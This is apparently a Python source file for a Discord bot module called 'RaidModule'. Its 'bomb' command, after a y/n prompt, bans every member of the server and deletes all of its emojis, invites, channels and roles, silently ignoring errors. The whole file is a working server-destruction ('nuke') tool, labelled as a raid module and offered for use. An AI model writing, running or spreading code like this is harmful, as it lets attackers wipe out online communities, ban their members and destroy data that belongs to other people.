'  The Imports (Do not change anything right here)  '
from UtilsDirectory.data import *


class RaidModule(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases=["guildbomb", "grenade"])
    async def bomb(self, ctx):
        await ctx.send(f"Kill the entire discord-server (`{ctx.guild.name}`)? [y/n]")

        def check_data(message):
            return message.author == ctx.message.author

        while True:
            try:
                msg = await self.bot.wait_for('message', check=check_data, timeout=int(timeout))
                if msg.content == "y":
                    await ctx.send(waitmsg)
                    for user in list(ctx.guild.members):
                        try:
                            await ctx.guild.ban(user)
                        except Exception:
                            pass
                    print(f"Banned all user.")
                    for emoji in list(ctx.guild.emojis):
                        try:
                            await emoji.delete()
                        except Exception:
                            pass
                    print(f"Deleted all emojis.")
                    for invite in await ctx.guild.invites():
                        try:
                            await invite.delete()
                        except Exception:
                            pass
                    print(f"Deleted all invites.")
                    for channels in list(ctx.guild.channels):
                        try:
                            await channels.delete()
                        except Exception:
                            pass
                    print(f"Deleted all channels.")
                    for roles in list(ctx.guild.roles):
                        try:
                            await roles.delete()
                        except Exception:
                            pass
                    print(f"Deleted all roles.")
                    return
                if msg.content == "n":
                    await ctx.send(no_msg)
                    return
            except asyncio.TimeoutError:
                await ctx.send(timeout_msg)
                return


def setup(bot):
    bot.add_cog(RaidModule(bot))
